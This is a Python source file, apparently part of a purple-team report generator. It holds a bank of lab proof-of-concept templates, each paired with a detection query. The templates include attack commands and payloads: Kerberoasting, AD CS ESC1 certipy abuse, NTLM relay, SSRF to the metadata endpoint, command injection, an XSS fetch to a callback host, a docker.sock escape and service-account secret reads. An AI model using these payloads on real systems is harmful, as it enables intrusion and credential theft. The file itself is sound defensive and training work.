"""Banco de exemplos concretos (PoC lab / HTTP / CLI / query) por slug e categoria."""
from __future__ import annotations

import hashlib
import re

HEADERS = [
    "## Exemplo",
    "## PoC mínimo",
    "## No lab ficou assim",
    "## Sinal / query",
]


def _H(s: str) -> int:
    return int(hashlib.sha256(s.encode()).hexdigest()[:8], 16)


def _tag(row: dict, angle: str | None) -> str:
    key = f"{row['fid']}/{row['slug']}/{angle or 'base'}"
    return hashlib.sha256(key.encode()).hexdigest()[:6]


def _fence(lang: str, body: str) -> str:
    return f"```{lang}\n{body.rstrip()}\n```"


# (regex em fid/slug/label, lang_off, body_off, lang_det, body_det)
# Placeholders: {slug} {fid} {tag} {label} {obj} {port}
KEYWORD_EXAMPLES: list[tuple[str, str, str, str, str]] = [
    (
        r"ad-kerberoast/rc4|kerberoast.*rc4",
        "bash",
        "# lab.local — TGS RC4 só de SPN candidata (não assar a floresta)\n"
        "GetUserSPNs.py lab.local/USER_A:PASS_LAB -dc-ip DC01.lab.local \\\n"
        "  -request -outputfile tgs_{slug}_{tag}.kirbi\n"
        "# filtrar: service_etype == rc4_hmac  (0x17)",
        "kusto",
        "SecurityEvent\n| where EventID == 4769\n| where TicketEncryptionType == '0x17'\n| where ServiceName !startswith 'krbtgt'\n| where AccountName == 'USER_A'\n| project TimeGenerated, AccountName, ServiceName, ClientAddress, TicketEncryptionType\n// tag {tag}",
    ),
    (
        r"ad-kerberoast/(aes|asrep|gmsa|spn|honey|deleg|opsec|bloodhound|report)",
        "bash",
        "# Kerberoast lab — amostra mínima amarrada a {slug}\n"
        "GetUserSPNs.py lab.local/USER_A:PASS_LAB -dc-ip DC01.lab.local -request \\\n"
        "  -outputfile roast_{slug}_{tag}.kirbi\n"
        "# crack offline em hashcat mode 13100; sem dump massivo",
        "kusto",
        "SecurityEvent\n| where EventID in (4769, 4768)\n| where AccountName == 'USER_A'\n| summarize count() by ServiceName, TicketEncryptionType\n// hunting {slug} {tag}",
    ),
    (
        r"ad-cs/esc1",
        "bash",
        "# AD CS ESC1 — lab CA + template enrollee low-priv\n"
        "certipy find -u USER_A@lab.local -p PASS_LAB -dc-ip DC01.lab.local -stdout\n"
        "certipy req -u USER_A@lab.local -p PASS_LAB -ca LAB-CA \\\n"
        "  -template ESC1Lab -upn administrator@lab.local -out esc1_{tag}\n"
        "# evidencia: .pfx + auth LDAP como admin (conta teste)",
        "text",
        "Event 4886/4887 (CA) + 4768 com certificate logon\n"
        "filtro: Requester=USER_A Template=ESC1Lab RequestID={tag}\n"
        "alerta se SAN/UPN != identidade do enrollee",
    ),
    (
        r"ad-cs/esc",
        "bash",
        "# AD CS {slug} — enum + request mínimo no lab\n"
        "certipy find -u USER_A@lab.local -p PASS_LAB -dc-ip DC01.lab.local -vulnerable\n"
        "certipy req -u USER_A@lab.local -p PASS_LAB -ca LAB-CA -template TPL_{slug} -out {slug}_{tag}",
        "text",
        "CA audit: Event 4886/4887 template TPL_{slug}\n"
        "correlacionar enrollee USER_A com uso do cert (4768) — tag {tag}",
    ),
    (
        r"ad-dacl/(genericall|writedacl|dcsync|addmember|forcechange|writespn|gpo|ou|adminsdholder|shadowcred)",
        "bash",
        "# DACL {slug} — prova de ACE sem mudança destrutiva\n"
        "bloodyAD --host DC01.lab.local -d lab.local -u USER_A -p PASS_LAB \\\n"
        "  get object 'CN=TARGET_OBJ,OU=Lab,DC=lab,DC=local' --attr nTSecurityDescriptor\n"
        "# edge esperado: {slug} → conta teste; tag {tag}",
        "text",
        "Directory Service Changes + 4662 Object Access\n"
        "Object: TARGET_OBJ Properties alteradas por USER_A (lab)\n"
        "edge {slug} — correlacionar com BloodHound path tag {tag}",
    ),
    (
        r"web-idor/numeric|idor.*numeric",
        "http",
        "GET /api/v1/orders/10042 HTTP/1.1\n"
        "Host: app.lab.local\n"
        "Cookie: session=USER_B\n"
        "# esperado: 403 — se 200 com dados de USER_A, BOLA\n"
        "# variante {slug} tag {tag}",
        "kusto",
        "AppRequests\n| where Url has '/api/v1/orders/'\n| where UserId == 'USER_B' and OwnerId == 'USER_A'\n| where ResultCode == 200\n| project TimeGenerated, Url, UserId, OwnerId\n// IDOR numeric {tag}",
    ),
    (
        r"web-idor/",
        "http",
        "GET /api/v1/resources/{obj} HTTP/1.1\n"
        "Host: app.lab.local\n"
        "Authorization: Bearer TOKEN_USER_B\n"
        "# object_id de USER_A — se 200 com PII, BOLA ({slug})\n"
        "# tag {tag}",
        "text",
        "access_log: user=USER_B resource={obj} owner=USER_A status=200\n"
        "regra: deny quando subject != owner — tag {tag} ({slug})",
    ),
    (
        r"web-ssrf/imds|ssrf-imds",
        "http",
        "POST /export/fetch HTTP/1.1\n"
        "Host: app.lab.local\n"
        "Content-Type: application/json\n"
        "\n"
        '{{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}}\n'
        "# lab: resposta com role name = prova de SSRF→IMDS (sem exfiltrar secret)\n"
        "# tag {tag}",
        "kusto",
        "CloudAppEvents\n| where RequestURL has '169.254.169.254'\n| where Application == 'app.lab.local'\n| project TimeGenerated, RequestURL, AccountObjectId\n// SSRF IMDS {tag}",
    ),
    (
        r"web-ssrf/",
        "http",
        "POST /hook/preview HTTP/1.1\n"
        "Host: app.lab.local\n"
        "Content-Type: application/json\n"
        "\n"
        '{{"target":"http://internal-admin.lab.local:{port}/health"}}\n'
        "# SSRF {slug}: corpo/timing prova alcance interno — tag {tag}",
        "text",
        "egress_proxy deny link-local + RFC1918 não allowlisted\n"
        "log: src=app dst=internal-admin.lab.local action=ALLOW? → gap ({slug}/{tag})",
    ),
    (
        r"api-jwt/alg-none",
        "http",
        "GET /api/me HTTP/1.1\n"
        "Host: api.lab.local\n"
        "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJUSER_AIiwicm9sZSI6ImFkbWluIn0.\n"
        "# se 200 com role admin sem verify → alg=none aceito\n"
        "# tag {tag}",
        "kusto",
        "AppTraces\n| where Message has 'jwt' and Message has 'alg'\n| where Message has 'none' or Message has 'verify failed'\n| project TimeGenerated, Message\n// jwt alg-none {tag}",
    ),
    (
        r"api-jwt/",
        "http",
        "GET /api/v1/admin/users HTTP/1.1\n"
        "Host: api.lab.local\n"
        "Authorization: Bearer JWT_{slug}_{tag}\n"
        "# claim tamper / kid / aud — ver variante {slug}",
        "text",
        "authz_fail OR jwt_verify_error claim={slug}\n"
        "alerta se alg in (none, HS256) com key pública — tag {tag}",
    ),
    (
        r"api-mass-assignment/",
        "http",
        "PATCH /api/v1/profile HTTP/1.1\n"
        "Host: api.lab.local\n"
        "Cookie: session=USER_A\n"
        "Content-Type: application/json\n"
        "\n"
        '{{"displayName":"lab","role":"admin","tenant_id":"TENANT_B"}}\n'
        "# mass-assign {slug}: GET depois e comparar role — tag {tag}",
        "text",
        "audit: user USER_A patched protected fields role/tenant_id\n"
        "expected deny — tag {tag} ({slug})",
    ),
    (
        r"api-graphql/",
        "http",
        "POST /graphql HTTP/1.1\n"
        "Host: api.lab.local\n"
        "Content-Type: application/json\n"
        "\n"
        '{{"query":"query {{ node(id:\\"{obj}\\") {{ ... on User {{ email role }} }} }}"}}\n'
        "# GraphQL {slug} — tag {tag}",
        "text",
        "graphql_complexity > budget OR node(id) cross-user 200\n"
        "variant {slug} tag {tag}",
    ),
    (
        r"auth-oauth|auth-mfa|auth-password",
        "http",
        "GET /oauth/authorize?client_id=APP_LAB&redirect_uri=https://evil.lab.local/cb&response_type=code&state={tag} HTTP/1.1\n"
        "Host: idp.lab.local\n"
        "# fluxo {slug}: capturar se redirect_uri fora do allowlist passa",
        "text",
        "Sign-in logs: unexpected redirect_uri OR MFA skipped for USER_A\n"
        "app=APP_LAB flow={slug} tag={tag}",
    ),
    (
        r"inj-sqli/",
        "http",
        "GET /items?id=1'+AND+1%3d1-- HTTP/1.1\n"
        "Host: app.lab.local\n"
        "Cookie: session=USER_A\n"
        "# boolean mínimo {slug}; sem DROP — tag {tag}",
        "text",
        "db_audit: syntax error OR atypical query from app_user\n"
        "pattern {slug} tag {tag}",
    ),
    (
        r"inj-cmd/",
        "http",
        "POST /tools/ping HTTP/1.1\n"
        "Host: app.lab.local\n"
        "Content-Type: application/json\n"
        "\n"
        '{{"host":"127.0.0.1; id"}}\n'
        "# lab only — saída de id prova inj {slug} tag {tag}",
        "text",
        "process_create parent=app cmd contains '; id' OR unexpected shell\n"
        "{slug} {tag}",
    ),
    (
        r"inj-ssti/",
        "http",
        "POST /render HTTP/1.1\n"
        "Host: app.lab.local\n"
        "Content-Type: application/x-www-form-urlencoded\n"
        "\n"
        "name={{{{7*7}}}}\n"
        "# se ecoa 49 → SSTI {slug}; sem RCE destrutivo — tag {tag}",
        "text",
        "app_log template_eval OR unexpected expression result 49\n"
        "engine hint {slug} tag {tag}",
    ),
    (
        r"client-xss/",
        "html",
        "<!-- reflected/stored lab payload — sem persistir em prod -->\n"
        "<img src=x onerror=\"fetch('https://oast.lab.local/{tag}')\">\n"
        "<!-- sink {slug}: sessão USER_A / cookie flags -->",
        "text",
        "csp_report OR xss_filter OR unusual script-src violation\n"
        "page={slug} tag={tag}",
    ),
    (
        r"client-csrf/",
        "html",
        "<form action=\"https://app.lab.local/api/settings/email\" method=\"POST\">\n"
        "  <input name=\"email\" value=\"attacker_{tag}@lab.local\">\n"
        "</form>\n"
        "<script>document.forms[0].submit()</script>\n"
        "<!-- CSRF {slug}: state change com cookie USER_A -->",
        "text",
        "state-changing POST sem CSRF token / SameSite=None cross-site\n"
        "{slug} {tag}",
    ),
    (
        r"xxe-classic/",
        "xml",
        '<?xml version="1.0"?>\n'
        "<!DOCTYPE r [\n"
        '  <!ENTITY xxe SYSTEM "file:///etc/hostname">\n'
        "]>\n"
        "<r>&xxe;</r>\n"
        "<!-- XXE {slug} lab read mínimo — tag {tag} -->",
        "text",
        "parser external entity resolved OR outbound to oast.lab.local\n"
        "{slug} {tag}",
    ),
    (
        r"net-llmnr|net-smb|petitpotam|relay",
        "bash",
        "# relay lab — segmento acordado, conta teste\n"
        "ntlmrelayx.py -t smb://TARGET.lab.local -smb2support --no-dump\n"
        "# trigger {slug}; evidência: auth USER_A + ação não destrutiva tag {tag}",
        "text",
        "Event 4624/4625 NTLM + unusual SourceWorkstation\n"
        "signing disabled on TARGET — {slug} {tag}",
    ),
    (
        r"win-privesc/|win-cred/",
        "powershell",
        "# lab Windows — enum sem LSASS dump em prod\n"
        "Get-Acl C:\\ServicePath\\svc.exe | Format-List\n"
        "sc.exe qc SVC_{slug}\n"
        "# writable + priv service = privesc path tag {tag}",
        "text",
        "Sysmon 1/7/11: service binary path change OR suspicious parent-child\n"
        "{slug} {tag}",
    ),
    (
        r"ad-cs/(persist|detect)",
        "bash",
        "# AD CS {slug} — lab CA, conta teste\n"
        "certipy find -u USER_A@lab.local -p PASS_LAB -dc-ip DC01.lab.local -vulnerable\n"
        "# persist: renovar cert de conta teste; detect: correlacionar 4886→4768\n"
        "# tag {tag} — sem shadow em prod",
        "kusto",
        "SecurityEvent\n| where EventID in (4886, 4887, 4768)\n| where Account == 'USER_A' or CertificateThumbprint has '{tag}'\n| project TimeGenerated, EventID, Account, CertificateThumbprint\n// AD CS {slug}",
    ),
    (
        r"linux-privesc/suid",
        "bash",
        "# lab — SUID GTFO; prod: só enum\n"
        "find / -perm -4000 -type f 2>/dev/null | tee suid_{tag}.txt\n"
        "# seguro em prod: listar + comparar baseline\n"
        "# destrutivo só em lab: ./vuln_suid -c 'id'  # NÃO em prod\n"
        "gtfobins hint: {slug}",
        "yaml",
        "title: Linux SUID abuse {tag}\n"
        "logsource:\n"
        "  product: linux\n"
        "  service: auditd\n"
        "detection:\n"
        "  selection:\n"
        "    type: EXECVE\n"
        "    a0|endswith: '/vuln_suid'\n"
        "  condition: selection\n",
    ),
    (
        r"linux-privesc/sudo",
        "bash",
        "# sudo -l em lab; sem NOPASSWD abuse em prod sem ROE\n"
        "sudo -l\n"
        "# seguro: documentar comando permitido\n"
        "# lab only: sudo vim -c ':!id'  # se NOPASSWD vim\n"
        "# tag {tag} ({slug})",
        "text",
        "auditd: USER_CMD sudo by USER_A unusual command\n"
        "alerta se comando fora do allowlist — {slug} {tag}",
    ),
    (
        r"linux-privesc/caps",
        "bash",
        "getcap -r / 2>/dev/null | grep -E 'cap_setuid|cap_sys_admin' | tee caps_{tag}.txt\n"
        "# lab: explorar bin com cap_setuid+ep; prod: só inventário\n"
        "# {slug}",
        "text",
        "auditd capset OR unexpected getcap enumeration from USER_A\n"
        "{slug} {tag}",
    ),
    (
        r"linux-privesc/docker",
        "bash",
        "# docker.sock / privileged — lab namespace\n"
        "ls -la /var/run/docker.sock\n"
        "# seguro em prod: reportar permissão sem spawn\n"
        "# lab only: docker run -v /:/mnt --rm alpine chroot /mnt id\n"
        "# tag {tag}",
        "kusto",
        "Syslog\n| where SyslogMessage has 'docker' and SyslogMessage has 'mount'\n| where ProcessName == 'dockerd'\n| project TimeGenerated, HostName, SyslogMessage\n// docker escape {tag}",
    ),
    (
        r"linux-privesc/(cron|nfs|ld-preload|kernel)",
        "bash",
        "# linux {slug} — enum mínimo lab\n"
        "ls -la /etc/cron* /var/spool/cron 2>/dev/null | head\n"
        "showmount -e nfs.lab.local 2>/dev/null\n"
        "echo $LD_PRELOAD\n"
        "# kernel exploit: SOMENTE lab clonado — tag {tag}\n"
        "# prod: evidencia de versão + CVE sem crash",
        "text",
        "auditd: cron job write OR nfs mount OR ld.so preload change\n"
        "variant {slug} tag {tag}",
    ),
    (
        r"azure-entra/consent",
        "bash",
        "# Entra consent — app de lab, tenant de teste\n"
        "az rest --method GET --url 'https://graph.microsoft.com/v1.0/oauth2PermissionGrants'\n"
        "# seguro: listar grants; sem consent phishing em prod\n"
        "# tag {tag}",
        "kusto",
        "AuditLogs\n| where OperationName has 'Consent to application'\n| where Result == 'success'\n| project TimeGenerated, InitiatedBy, TargetResources\n// consent {tag}",
    ),
    (
        r"azure-entra/prt",
        "bash",
        "# PRT / Primary Refresh Token — só lab device\n"
        "az account get-access-token --resource https://graph.microsoft.com\n"
        "# NÃO extrair PRT de endpoint prod; tag {tag}",
        "kusto",
        "SigninLogs\n| where DeviceDetail.isCompliant == false or AuthenticationProtocol has 'prt'\n| where UserPrincipalName == 'USER_A@lab.local'\n| project TimeGenerated, AppDisplayName, IPAddress\n// PRT {tag}",
    ),
    (
        r"azure-entra/(ca-gap|app-role|pim|b2b|saml|device-code)",
        "bash",
        "# Entra {slug} — Graph read / role enum em tenant lab\n"
        "az ad sp list --display-name 'APP_LAB' -o table\n"
        "az rest --method GET --url 'https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments'\n"
        "# tag {tag} — sem spam de CA challenge",
        "kusto",
        "AuditLogs\n| where OperationName has '{slug}' or OperationName has 'Add app role'\n| project TimeGenerated, OperationName, InitiatedBy\n// entra {tag}",
    ),
    (
        r"k8s-escape/sa-token",
        "bash",
        "# k8s lab ns — SA token mount\n"
        "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\n"
        "curl -sk -H \"Authorization: Bearer $TOKEN\" https://kubernetes.default/api/v1/namespaces/lab/secrets | head\n"
        "# seguro: can-i; lab: get secrets — tag {tag}",
        "yaml",
        "title: K8s SA secret list {tag}\n"
        "logsource:\n"
        "  product: kubernetes\n"
        "detection:\n"
        "  selection:\n"
        "    verb: list\n"
        "    objectRef.resource: secrets\n"
        "    user.username|contains: 'system:serviceaccount:lab:'\n"
        "  condition: selection\n",
    ),
    (
        r"k8s-escape/privileged|k8s-escape/hostpath",
        "bash",
        "# privileged/hostPath — lab only\n"
        "kubectl -n lab-{tag} auth can-i create pods --as=system:serviceaccount:lab:sa-{slug}\n"
        "kubectl -n lab-{tag} get psp,validatingadmissionpolicy 2>/dev/null | head\n"
        "# lab only: pod privileged + hostPath / (não aplicar em prod)\n"
        "# kubectl run probe-{slug} --image=busybox --privileged — tag {tag}",
        "text",
        "apiserver audit: create pod privileged=true OR hostPath=/\n"
        "ns=lab user=sa-{slug} tag={tag}",
    ),
    (
        r"k8s-escape/(rbac|docker-sock|etcd|ingress|imds)",
        "bash",
        "# k8s {slug} lab namespace\n"
        "kubectl -n lab auth can-i --list --as=system:serviceaccount:lab:sa-{slug}\n"
        "kubectl -n lab get rolebinding,clusterrolebinding -o wide | head\n"
        "# imds via pod: curl 169.254.169.254 — só lab; tag {tag}",
        "kusto",
        "ContainerLog\n| where LogEntry has '169.254.169.254' or LogEntry has 'etcd'\n| project TimeGenerated, PodName, LogEntry\n// k8s {slug} {tag}",
    ),
    (
        r"mobile-android/(exported|deeplink|webview)",
        "bash",
        "# Android lab build — sem store\n"
        "adb shell dumpsys package app.lab | grep -A2 exported=true\n"
        "adb shell am start -a android.intent.action.VIEW \\\n"
        "  -d 'app://lab/{slug}?token=TOKEN_LAB_{tag}'\n"
        "# WebView: overrideUrlLoading → token sink",
        "text",
        "mobile_telemetry: exported activity/deeplink with foreign token\n"
        "component={slug} tag={tag}",
    ),
    (
        r"mobile-android/(storage|pinning|crypto|backup|clip)",
        "bash",
        "# Android {slug} — build de teste\n"
        "adb shell run-as app.lab ls shared_prefs/\n"
        "adb backup -f bak_{tag}.ab app.lab  # só lab build\n"
        "frida -U -f app.lab -l bypass_pinning.js  # NÃO em prod store",
        "text",
        "backup enabled OR plaintext token in shared_prefs\n"
        "variant {slug} tag {tag}",
    ),
    (
        r"mobile-ios/(keychain|url-scheme|ats|pasteboard|ssl|biometry|ipc|backup)",
        "bash",
        "# iOS lab IPA — {slug}\n"
        "frida -U -f app.lab.ios -l enumerate_keychain.js\n"
        "# url scheme: xcrun simctl openurl booted 'applab://{slug}?t={tag}'\n"
        "# ATS bypass só em build debug",
        "text",
        "ios_telemetry: keychain access OR ats exception OR pasteboard token\n"
        "{slug} {tag}",
    ),
    (
        r"wifi-evil-twin/(portal|karma|eap|pmkid|wps|wpa3|detect|iot)",
        "bash",
        "# RF lab — ROE escrito: canal/área/potência\n"
        "# seguro: scan passivo\n"
        "airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon | tee wifi_{tag}.log\n"
        "# destrutivo só em lab isolado: hostapd evil twin SSID LAB-{tag}\n"
        "# NÃO pulverizar o prédio — {slug}",
        "yaml",
        "title: Rogue AP {slug}\n"
        "detection:\n"
        "  selection:\n"
        "    event.category: wireless\n"
        "    wireless.ssid: 'LAB-{tag}'\n"
        "  condition: selection\n",
    ),
    (
        r"crypto-tls/(legacy|weak-cipher|renego)",
        "bash",
        "# TLS no host real do app — {slug}\n"
        "echo | openssl s_client -connect TARGET.lab.local:{port} -tls1 2>&1 | head -20\n"
        "# seguro: enum cipher; sem downgrade ativo contra usuários reais\n"
        "nmap --script ssl-enum-ciphers -p {port} TARGET.lab.local\n"
        "# tag {tag}",
        "text",
        "tls_inspection: protocol<=TLS1.0 OR cipher RC4/3DES on TARGET:{port}\n"
        "{slug} {tag}",
    ),
    (
        r"crypto-tls/(cert-mismatch|expired|hsts|mixed|mtls)",
        "bash",
        "# TLS {slug}\n"
        "echo | openssl s_client -connect TARGET.lab.local:{port} -servername WRONG.lab.local 2>&1 | grep -E 'verify|subject'\n"
        "curl -skI https://TARGET.lab.local | grep -i strict-transport\n"
        "# tag {tag}",
        "kusto",
        "AppServiceHTTPLogs\n| where ScStatus == 400 or Cssystem has 'cert'\n| where CsHost == 'TARGET.lab.local'\n| take 20\n// tls {slug} {tag}",
    ),
    (
        r"api-jwt/(kid-sqli|jku|weak-secret|refresh|aud-iss|claim-tamper)",
        "http",
        "GET /api/v1/admin HTTP/1.1\n"
        "Host: api.lab.local\n"
        "Authorization: Bearer JWT_{slug}_{tag}\n"
        "# seguro em prod: claim tamper em token de TESTE\n"
        "# lab: kid=../../dev/null / jku=https://evil.lab.local/jwks.json",
        "kusto",
        "AppTraces\n| where Message has 'jwt' and (Message has 'kid' or Message has 'jku' or Message has 'aud')\n| project TimeGenerated, Message\n// jwt {slug} {tag}",
    ),
    (
        r"api-graphql/(introspection|nested-dos|alias-bruteforce|batch|csrf|suggestion)",
        "http",
        "POST /graphql HTTP/1.1\n"
        "Host: api.lab.local\n"
        "Content-Type: application/json\n"
        "\n"
        '{{"query":"query {{ __schema {{ types {{ name }} }} }}"}}\n'
        "# {slug}: introspection/DoS — rate-limit no lab; tag {tag}\n"
        "# prod: profundidade 1, sem nested bomb",
        "text",
        "graphql_complexity > budget OR introspection enabled in prod\n"
        "variant {slug} tag {tag}",
    ),
    (
        r"linux-privesc/",
        "bash",
        "# linux privesc lab — {slug}\n"
        "find / -perm -4000 -type f 2>/dev/null | head\n"
        "sudo -l\n"
        "getcap -r / 2>/dev/null | head\n"
        "# foco {slug} tag {tag}\n"
        "# exploit com crash: só lab clonado",
        "text",
        "auditd: execve of SUID OR sudo unusual OR capset\n"
        "{slug} {tag}",
    ),
    (
        r"azure-entra/",
        "bash",
        "# Entra lab — Graph read mínimo\n"
        "az login --service-principal -u APP_LAB -p PASS_LAB --tenant TENANT_LAB\n"
        "az rest --method GET --url 'https://graph.microsoft.com/v1.0/me'\n"
        "# variante {slug} tag {tag}",
        "kusto",
        "AuditLogs\n| where TimeGenerated > ago(1h)\n| where InitiatedBy has 'USER_A' or TargetResources has '{slug}'\n| project TimeGenerated, OperationName, Result\n// entra {tag}",
    ),
    (
        r"aws-privesc/|aws-s3/",
        "bash",
        "# AWS lab — identidade de teste, sem wipe\n"
        "aws sts get-caller-identity --profile lab_{tag}\n"
        "aws s3api get-bucket-policy --bucket lab-bucket-{slug} --profile lab_{tag}\n"
        "# seguro: Get*/List*; destrutivo (DeleteBucket) só em lab throwaway\n"
        "# effective perms {slug}",
        "kusto",
        "CloudTrail\n| where eventName in ('AssumeRole','PutBucketPolicy','CreatePolicyVersion')\n| where userIdentity.accessKeyId has 'ASIA_LAB' or userIdentity.accessKeyId has '{tag}'\n| project eventTime, eventName, userIdentity.arn, sourceIPAddress\n// aws {slug}",
    ),
    (
        r"rt-c2/",
        "bash",
        "# C2 lab — kill-switch e janela\n"
        "curl -sk https://c2.lab.local/{slug}/beacon -H 'X-Session: {tag}'\n"
        "# só conta teste; sem persistência fora do ROE",
        "text",
        "proxy/DNS: periodic beacon to c2.lab.local path /{slug}/\n"
        "JA3/UA anomaly tag {tag}",
    ),
    (
        r"purple-detect/",
        "yaml",
        "title: Purple {slug}\n"
        "logsource:\n"
        "  product: windows\n"
        "detection:\n"
        "  selection:\n"
        "    EventID: 1\n"
        "    CommandLine|contains: '{tag}'\n"
        "  condition: selection\n"
        "# atomic {slug} — uma execução limpa",
        "kusto",
        "DeviceProcessEvents\n| where ProcessCommandLine has '{tag}'\n| project Timestamp, DeviceName, ProcessCommandLine\n// purple {slug}",
    ),
    (
        r"k8s-escape/",
        "bash",
        "# k8s lab namespace\n"
        "kubectl -n lab-{tag} auth can-i --list --as=system:serviceaccount:lab:sa-{slug}\n"
        "kubectl -n lab-{tag} get secrets\n"
        "# prova RBAC excessivo {slug}",
        "text",
        "apiserver audit: get secrets OR create privileged pod\n"
        "sa=sa-{slug} ns=lab-{tag}",
    ),
    (
        r"mobile-android/|mobile-ios/",
        "bash",
        "# mobile lab build — sem store production\n"
        "adb shell am start -a android.intent.action.VIEW \\\n"
        "  -d 'app://lab/{slug}?token=TOKEN_LAB_{tag}'\n"
        "# deep link / exported → token sink",
        "text",
        "mobile_telemetry: exported component invoked with foreign token\n"
        "{slug} {tag}",
    ),
    (
        r"wifi-evil-twin/",
        "bash",
        "# RF lab — ROE por escrito, canal/área fixos\n"
        "hostapd ./lab_{slug}.conf  # SSID LAB-{tag}\n"
        "# capturar cred de USER_A em portal de teste; sem pulverizar o prédio",
        "text",
        "wireless IDS: unexpected AP BSSID spoofing LAB-{tag}\n"
        "assoc de conta teste USER_A — {slug}",
    ),
    (
        r"crypto-tls/",
        "bash",
        "# TLS no host real do app\n"
        "nmap --script ssl-enum-ciphers -p {port} TARGET.lab.local\n"
        "echo | openssl s_client -connect TARGET.lab.local:{port} -tls1_0 2>&1 | head\n"
        "# variante {slug} tag {tag}",
        "text",
        "tls_inspection: protocol<TLS1.2 OR weak cipher on TARGET:{port}\n"
        "{slug} {tag}",
    ),
    (
        r"report-quality/|method-scope/",
        "text",
        "finding_id: F-{tag}\n"
        "variant: {slug}\n"
        "repro: passos 1–n em lab.local com USER_A\n"
        "cleanup: reverter objeto {obj}; reteste path anexado\n"
        "cvss: environmental justificado (não só base)",
        "text",
        "checklist peer-review: ROE · PoC redigido · cleanup · MITRE\n"
        "nota {slug} tag {tag}",
    ),
    (
        r"recon-passive-dns/|recon-http|recon-osint",
        "bash",
        "# recon passivo autorizado\n"
        "curl -sS 'https://crt.sh/?q=%25.lab.local&output=json' | jq '.[].name_value' | sort -u\n"
        "# marcar dev-/staging- ; tag {tag} ({slug})",
        "text",
        "CT monitor: new SAN *.lab.local issued\n"
        "DNS NXDOMAIN spike for enum pattern — {slug} {tag}",
    ),
    (
        r"web-upload/",
        "http",
        "POST /upload HTTP/1.1\n"
        "Host: app.lab.local\n"
        "Content-Type: multipart/form-data; boundary=----{tag}\n"
        "\n"
        "------{tag}\n"
        'Content-Disposition: form-data; name="file"; filename="probe_{slug}.txt"\n'
        "Content-Type: text/plain\n"
        "\n"
        "lab-probe-{tag}\n"
        "------{tag}--\n"
        "# sem webshell em prod; só lab",
        "text",
        "upload_log: unexpected content-type OR path traversal filename\n"
        "{slug} {tag}",
    ),
]

# fallbacks por categoria: várias variantes (lang, body)
CAT_FALLBACKS: dict[str, list[tuple[str, str]]] = {
    "01-recon": [
        ("bash", "dig TXT lab.local +short\nwhois lab.local | head -20\n# recon {slug} tag {tag}"),
        ("bash", "curl -sI https://TARGET.lab.local | sed -n '1,20p'\n# fingerprint {slug} {tag}"),
    ],
    "02-web": [
        ("http", "GET /{slug}?id={obj} HTTP/1.1\nHost: app.lab.local\nCookie: session=USER_A\n# tag {tag}"),
        ("bash", "curl -sk 'https://app.lab.local/{slug}' -H 'Cookie: session=USER_A'\n# tag {tag}"),
    ],
    "03-api": [
        ("http", "GET /api/{slug} HTTP/1.1\nHost: api.lab.local\nAuthorization: Bearer TOKEN_USER_A\n# tag {tag}"),
        ("bash", "curl -sk https://api.lab.local/api/{slug} -H 'Authorization: Bearer TOKEN_USER_A'\n# {tag}"),
    ],
    "04-auth": [
        ("http", "POST /login HTTP/1.1\nHost: idp.lab.local\nContent-Type: application/json\n\n"
         '{{"user":"USER_A","password":"PASS_LAB","flow":"{slug}"}}\n# tag {tag}'),
        ("bash", "curl -sk -X POST https://idp.lab.local/login -d 'user=USER_A&pass=PASS_LAB'\n# {slug} {tag}"),
    ],
    "05-injection": [
        ("http", "GET /q?x=test_{tag} HTTP/1.1\nHost: app.lab.local\n# inject probe {slug}"),
        ("bash", "sqlmap -u 'https://app.lab.local/q?x=1' --batch --level=1 --technique=B -D lab --tables\n"
         "# só lab; tag {tag} ({slug})"),
    ],
    "06-client": [
        ("html", "<script>/* {slug} */ fetch('/api/me',{{credentials:'include'}}).then(r=>r.text()).then(console.log)</script>\n"
         "<!-- tag {tag} -->"),
        ("javascript", "// {slug}\nfetch('https://app.lab.local/api/settings', {{method:'POST', credentials:'include', body:'x={tag}'}})"),
    ],
    "07-ssrf-xxe": [
        ("http", "POST /parse HTTP/1.1\nHost: app.lab.local\nContent-Type: application/xml\n\n"
         "<r>{slug}-{tag}</r>"),
        ("bash", "curl -sk -X POST https://app.lab.local/fetch -d 'url=http://127.0.0.1:{port}/'\n# {slug} {tag}"),
    ],
    "08-network": [
        ("bash", "nxc smb TARGET.lab.local -u USER_A -p PASS_LAB --shares\n# {slug} {tag}"),
        ("bash", "nmap -p 445,139 TARGET.lab.local --script smb-security-mode\n# {slug} {tag}"),
    ],
    "09-ad": [
        ("bash", "ldapsearch -H ldap://DC01.lab.local -D 'USER_A@lab.local' -w PASS_LAB -b 'DC=lab,DC=local' '(sAMAccountName=USER_A)'\n# {slug} {tag}"),
        ("bash", "impacket-GetADUsers lab.local/USER_A:PASS_LAB -all -dc-ip DC01.lab.local | head\n# {slug} {tag}"),
    ],
    "10-windows": [
        ("powershell", "whoami /priv\nGet-Service | ? Status -eq Running | select -First 5\n# {slug} {tag}"),
        ("cmd", "icacls C:\\lab\\{slug}\nsc query\nREM tag {tag}"),
    ],
    "11-linux": [
        ("bash", "id; ls -l /usr/bin/sudo; cat /etc/sudoers.d/* 2>/dev/null\n# {slug} {tag}"),
        ("bash", "ls -la /var/run/docker.sock 2>/dev/null; find / -name '*{slug}*' 2>/dev/null | head\n# {tag}"),
    ],
    "12-aws": [
        ("bash", "aws iam get-user --profile lab_{tag}\naws s3 ls --profile lab_{tag}\n# {slug}"),
        ("bash", "aws logs filter-log-events --log-group-name /lab/{slug} --filter-pattern '{tag}' --profile lab"),
    ],
    "13-azure": [
        ("bash", "az ad signed-in-user show\naz role assignment list --assignee USER_A -o table\n# {slug} {tag}"),
        ("text", "Entra audit: activity={slug} initiatedBy=USER_A correlationId={tag}"),
    ],
    "14-k8s": [
        ("bash", "kubectl -n lab get sa,rolebinding\nkubectl -n lab auth can-i get secrets --as=system:serviceaccount:lab:default\n# {slug} {tag}"),
        ("yaml", "apiVersion: v1\nkind: Pod\nmetadata:\n  name: probe-{tag}\n  namespace: lab\nspec:\n  containers:\n  - name: c\n    image: busybox\n    command: ['sleep','3600']\n# {slug}"),
    ],
    "15-mobile": [
        ("bash", "frida -U -f app.lab.{slug} -l enumerate.js\n# build de teste tag {tag}"),
        ("text", "logcat | grep -i token\n# storage/deeplink {slug} {tag}"),
    ],
    "16-wireless": [
        ("bash", "iwlist wlan0 scan | grep -A2 LAB-{tag}\n# {slug} ROE RF"),
